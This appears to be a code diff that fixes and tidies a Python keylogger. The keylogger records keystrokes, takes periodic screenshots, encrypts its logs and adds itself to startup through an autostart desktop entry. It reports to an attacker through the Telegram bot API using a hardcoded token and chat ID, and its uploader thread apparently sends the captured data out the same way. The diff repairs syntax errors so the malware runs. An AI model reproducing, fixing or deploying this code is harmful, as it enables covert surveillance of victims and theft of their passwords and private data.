@@ -4,7 +4,7 @@
 # 3. Log File Encryption
 # 4. Persistence
 
-# Import modules
+
 from tempfile import gettempdir
 from os import system, name, getenv, path, makedirs
 from os.path import isfile, exists, join, expanduser
@@ -18,12 +18,13 @@ import pyautogui
 import platform
 from cryptography.fernet import Fernet
 
+# Hardcoded values (not recommended for production)
+TOKEN = "7351189183:AAEvrxX6-o3nZsvvDTGr_NKTyN79nO9DqtA"  # Telegram API Token
+CHAT_ID = "5818909184"  # Telegram Chat ID
 
-TOKEN = 7351189183:AAEvrxX6-o3nZsvvDTGr_NKTyN79nO9DqtA  # Telegram API Token
-CHAT_ID = 5818909184  # Telegram Chat ID
+# Constants
 INTERVAL = 60
-SCREENSHOT_INTERVAL = 90  # Interval for taking screenshots(in seconds)
-
+SCREENSHOT_INTERVAL = 90  # Interval for taking screenshots (in seconds)
 
 # Determine the temporary directory based on the OS
 temp_dir = gettempdir()
@@ -31,13 +32,11 @@ FILENAME = join(temp_dir, f'{datetime.now().strftime(".%d%m%Y%H%M%S")}.log')
 ENCRYPTED_FILENAME = f'{FILENAME}.enc'
 SCREENSHOT_FILENAME = join(temp_dir, 'screenshot.png')
 
-
 # Generate a key for encryption
 key = Fernet.generate_key()
 cipher_suite = Fernet(key)
 
-
-# To notify attacker if nay issues occur
+# To notify attacker if any issues occur
 def alarm(msg) -> None:
     requests.get(f'https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={msg}')
 
@@ -59,7 +58,7 @@ class Keylogger:
         except Exception as e:
             alarm(f'Error: {e}')
 
-    def Keylogging(self) -> None:
+    def keylogging(self) -> None:
         def on_key_press(key) -> None:
 
             def is_duplicate(data) -> bool:
@@ -196,7 +195,7 @@ def add_to_startup() -> None:
                 with open(desktop_file_path, 'w') as f:
                     f.write(f"""[Desktop Entry]
                     Type=Application
-                    Exec=python3{script_path}
+                    Exec=python3 {script_path}
                     Hidden=false
                     X-GNOME-Autostart-enabled=true
                     Name=Keylogger
@@ -226,16 +225,17 @@ if __name__ == '__main__':
         uploader_thread = threading.Thread(target=uploader.upload_file_periodically, daemon=True)
         screenshot_thread = threading.Thread(target=screenshot_capture.capture_periodically, daemon=True)
 
-
         # Start threads
         keylogger_thread.start()
         uploader_thread.start()
         screenshot_thread.start()
 
-        # Join threads
-        keylogger_thread.join()
-        uploader_thread.join()
-        screenshot_thread.join()
+        # Keep the main thread alive
+        try:
+            while True:
+                sleep(1)
+        except KeyboardInterrupt:
+            pass
 
-    except KeyboardInterrupt:
-        pass
+    except Exception as e:
+        alarm(f'Main Error: {e}')
